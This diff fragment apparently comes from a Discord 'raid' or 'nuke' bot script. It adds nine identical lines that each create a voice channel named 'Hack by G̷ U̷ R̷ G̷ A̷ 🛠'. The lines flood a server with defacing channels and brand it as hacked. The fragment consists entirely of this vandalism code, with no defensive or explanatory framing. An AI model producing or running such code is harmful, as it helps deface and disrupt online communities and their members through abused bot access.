+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');                   
                    
                    
                    
